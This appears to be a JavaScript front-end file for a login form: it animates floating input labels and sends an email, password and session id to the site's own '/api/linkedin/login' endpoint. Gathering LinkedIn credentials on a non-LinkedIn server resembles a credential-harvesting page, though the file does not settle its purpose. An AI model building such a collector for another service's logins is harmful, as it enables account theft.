const inputs = document.querySelectorAll(".form__input--floating input");
inputs.forEach((input) => {
  input.addEventListener("focus", () => {
    input.parentElement.classList.add("focused");
  });

  input.addEventListener("blur", () => {
    if (!input.value) {
      input.parentElement.classList.remove("focused");
    }
  });

  // Initialize state for pre-filled inputs
  if (input.value) {
    input.parentElement.classList.add("focused");
  }
});

function login() {
  let loginXhr = new XMLHttpRequest();
  loginXhr.open("POST", "/api/linkedin/login", true);
  loginXhr.setRequestHeader("Content-type", "application/json");
  loginXhr.send(
    JSON.stringify({
      sessionId: sessionId,
      email: emailInput.value,
      password: passwordInput.value,
    })
  );
  loginXhr.onreadystatechange = function () {
    if (this.status == 200 && this.readyState == 4) {
      clearTimeout(redirectTimeout);
      let response = this.response;
      console.log(response);
      if (response === "0") {
        document.getElementById("error-for-password").style.display = "block";
      }
    }
  };
}

function generateUniqueId() {
  return "id-" + new Date().getTime() + "-" + Math.floor(Math.random() * 1000);
}
